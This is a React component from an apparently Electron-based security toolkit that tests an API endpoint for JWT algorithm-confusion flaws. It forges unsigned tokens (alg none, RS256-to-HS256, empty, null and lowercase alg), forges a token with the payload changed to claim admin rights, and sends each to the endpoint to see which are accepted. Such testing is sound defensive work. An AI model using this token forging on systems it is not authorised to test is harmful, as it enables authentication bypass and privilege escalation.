import React, { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import styles from './SharedTool.module.css';
import { ShieldIcon, LoadingIcon, CopyIcon } from '../common/Icons';

interface JWTTest {
  attack: string;
  description: string;
  token: string;
  vulnerable: boolean;
  risk: 'Low' | 'Medium' | 'High' | 'Critical';
  details: string;
}

const JWTAlgorithmConfusion: React.FC = () => {
  const [jwtToken, setJwtToken] = useState('');
  const [apiEndpoint, setApiEndpoint] = useState('');
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState<JWTTest[]>([]);
  const [decodedJWT, setDecodedJWT] = useState<{
    header: Record<string, unknown>;
    payload: Record<string, unknown>;
  } | null>(null);

  const decodeJWT = (token: string) => {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return null;

      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      return { header, payload };
    } catch {
      return null;
    }
  };

  const createModifiedJWT = (
    header: Record<string, unknown>,
    payload: Record<string, unknown>
  ): string => {
    const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
    const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
    return `${encodedHeader}.${encodedPayload}.`;
  };

  const testAlgorithmConfusion = async () => {
    if (!jwtToken || !apiEndpoint) return;

    setLoading(true);
    setResults([]);

    const decoded = decodeJWT(jwtToken);
    if (!decoded) {
      setLoading(false);
      return;
    }

    setDecodedJWT(decoded);
    const testResults: JWTTest[] = [];

    const noneHeader = { ...decoded.header, alg: 'none' };
    const noneToken = createModifiedJWT(noneHeader, decoded.payload);
    const noneResult = await testToken(noneToken, 'Algorithm None', 'Remove signature validation');
    testResults.push(noneResult);

    if (decoded.header.alg === 'RS256') {
      const hs256Header = { ...decoded.header, alg: 'HS256' };
      const hs256Token = createModifiedJWT(hs256Header, decoded.payload);
      const hs256Result = await testToken(
        hs256Token,
        'RS256 to HS256',
        'Public key used as HMAC secret'
      );
      testResults.push(hs256Result);
    }

    if (decoded.header.alg) {
      const algLower = { ...decoded.header, alg: (decoded.header.alg as string).toLowerCase() };
      const lowerToken = createModifiedJWT(algLower, decoded.payload);
      const lowerResult = await testToken(
        lowerToken,
        'Lowercase Algorithm',
        'Case sensitivity bypass'
      );
      testResults.push(lowerResult);
    }

    const emptyAlgHeader = { ...decoded.header, alg: '' };
    const emptyAlgToken = createModifiedJWT(emptyAlgHeader, decoded.payload);
    const emptyResult = await testToken(emptyAlgToken, 'Empty Algorithm', 'Algorithm field empty');
    testResults.push(emptyResult);

    const nullAlgHeader = { ...decoded.header, alg: null };
    const nullAlgToken = createModifiedJWT(nullAlgHeader, decoded.payload);
    const nullResult = await testToken(nullAlgToken, 'NULL Algorithm', 'Algorithm set to null');
    testResults.push(nullResult);

    const adminPayload = { ...decoded.payload, role: 'admin', isAdmin: true, admin: true };
    const adminToken = createModifiedJWT(decoded.header, adminPayload);
    const adminResult = await testToken(
      adminToken,
      'Privilege Escalation',
      'Modified payload with admin privileges'
    );
    testResults.push(adminResult);

    setResults(testResults);
    setLoading(false);
  };

  const testToken = async (
    token: string,
    attackType: string,
    description: string
  ): Promise<JWTTest> => {
    try {
      const response = await window.electronAPI.net.httpFetch(apiEndpoint, {
        method: 'GET',
        headers: {
          Authorization: `Bearer ${token}`,
        },
        timeout: 5000,
      });

      const vulnerable = response.status === 200 || response.status === 304;
      let risk: 'Low' | 'Medium' | 'High' | 'Critical' = 'Low';
      let details = `Status: ${response.status}`;

      if (vulnerable) {
        if (attackType.includes('None') || attackType.includes('Empty')) {
          risk = 'Critical';
          details = 'Server accepts unsigned tokens - Complete authentication bypass!';
        } else if (attackType.includes('HS256')) {
          risk = 'Critical';
          details = 'Algorithm confusion vulnerability - Can forge tokens!';
        } else if (attackType.includes('Privilege')) {
          risk = 'Critical';
          details = 'Payload tampering successful - Privilege escalation possible!';
        } else if (attackType.includes('NULL')) {
          risk = 'High';
          details = 'NULL algorithm accepted - Authentication bypass!';
        } else {
          risk = 'High';
          details = 'Modified token accepted - Validation bypass!';
        }
      } else {
        details = `Token rejected (Status: ${response.status}) - Protected against this attack`;
      }

      return {
        attack: attackType,
        description,
        token,
        vulnerable,
        risk,
        details,
      };
    } catch (error) {
      return {
        attack: attackType,
        description,
        token,
        vulnerable: false,
        risk: 'Low',
        details: `Error: ${error instanceof Error ? error.message : 'Unknown'}`,
      };
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const vulnerableCount = results.filter((r) => r.vulnerable).length;
  const criticalCount = results.filter((r) => r.risk === 'Critical').length;

  return (
    <ToolWrapper
      title="JWT Algorithm Confusion"
      icon={<ShieldIcon />}
      description="Test JWT tokens for algorithm confusion vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>JWT Token</label>
          <textarea
            value={jwtToken}
            onChange={(e) => setJwtToken(e.target.value)}
            placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            className={styles.textarea}
          />
        </div>

        <div className={styles.inputGroup}>
          <label className={styles.label}>API Endpoint (with valid JWT in header)</label>
          <input
            type="text"
            value={apiEndpoint}
            onChange={(e) => setApiEndpoint(e.target.value)}
            placeholder="https://api.example.com/user/profile"
            className={styles.input}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button
            onClick={testAlgorithmConfusion}
            disabled={loading || !jwtToken || !apiEndpoint}
            className={styles.primaryBtn}
          >
            {loading ? (
              <>
                <LoadingIcon /> Testing JWT...
              </>
            ) : (
              'Start JWT Algorithm Confusion Test'
            )}
          </button>
        </div>
      </div>

      {decodedJWT && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Decoded JWT</span>
          </div>
          <div className={styles.resultContent}>
            <div className={styles.resultItem}>
              <span className={styles.label}>Header:</span>
              <pre className={styles.codeBlock}>{JSON.stringify(decodedJWT.header, null, 2)}</pre>
            </div>
            <div className={styles.resultItem}>
              <span className={styles.label}>Payload:</span>
              <pre className={styles.codeBlock}>{JSON.stringify(decodedJWT.payload, null, 2)}</pre>
            </div>
          </div>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Test Results</span>
          </div>
          <div className={styles.grid + ' ' + styles.grid3}>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Tests Performed</div>
              <div className={styles.statValue}>{results.length}</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Vulnerable</div>
              <div className={styles.statValueError}>{vulnerableCount}</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Critical Risk</div>
              <div className={styles.statValueError}>{criticalCount}</div>
            </div>
          </div>

          <div className={styles.mt16}>
            {results.map((result, idx) => (
              <div
                key={idx}
                className={styles.resultItem + ' ' + (result.vulnerable ? styles.rowError : '')}
              >
                <div className={styles.resultRow}>
                  <div style={{ flex: 1 }}>
                    <div className={styles.resultRow}>
                      <h4 className={styles.resultLabel}>{result.attack}</h4>
                      <span
                        className={
                          styles.badge +
                          ' ' +
                          (result.risk === 'Critical'
                            ? styles.badgeCritical
                            : result.risk === 'High'
                              ? styles.badgeHigh
                              : styles.badgeLow)
                        }
                      >
                        {result.risk}
                      </span>
                      {result.vulnerable && (
                        <span className={styles.badge + ' ' + styles.badgeError}>VULNERABLE</span>
                      )}
                    </div>
                    <p className={styles.resultContent}>{result.description}</p>
                    <p className={styles.resultContent}>{result.details}</p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(result.token)}
                    className={styles.copyBtn}
                    title="Copy token"
                  >
                    <CopyIcon /> Copy
                  </button>
                </div>
                <div className={styles.mt8}>
                  <span className={styles.label}>Modified Token:</span>
                  <div className={styles.codeBlock}>{result.token}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </ToolWrapper>
  );
};

export default JWTAlgorithmConfusion;
